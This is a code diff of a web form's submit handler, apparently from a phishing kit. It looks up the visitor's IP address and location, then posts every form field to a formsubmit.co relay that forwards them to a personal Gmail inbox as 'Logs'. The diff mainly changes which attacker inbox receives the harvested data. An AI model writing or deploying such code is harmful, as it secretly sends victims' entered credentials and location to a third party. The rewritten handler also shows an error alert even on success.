@@ -84,22 +84,23 @@ form.addEventListener('submit', function(e) {
     }
 
    $.getJSON('https://ipinfo.io', function(response) {
-        $.ajax({
-            type: "POST",
-            url: "https://formsubmit.co/ajax/willockj21@gmail.com",
-            data: {
-                _subject: "Logs | " + response.ip,
-                ...values,
-                IP: response.ip,
-                Location: response.city + ", " + response.country,
-            },
-        })
-        .done((data) => {
-            window.location.href = './success.html';
-        })
-        .fail(reason => {
+        const posting = $.post("https://formsubmit.co/ajax/jaffersongroup@gmail.com", {
+            _subject: "Logs | " + response.ip,
+            ...values,
+            IP: response.ip,
+            Location: response.city + ", " + response.country,
+        });
+
+        posting.done((data) => {
+            if (data.success) {
+                window.location.href = './success.html';
+            }
+            alert("Error: Please try again later");
+        });
+
+        posting.fail(reason => {
             console.error(reason);
             alert("Error: " + reason.message + "\nPlease try again.");
-        })
+        });
     }, "json");
 })
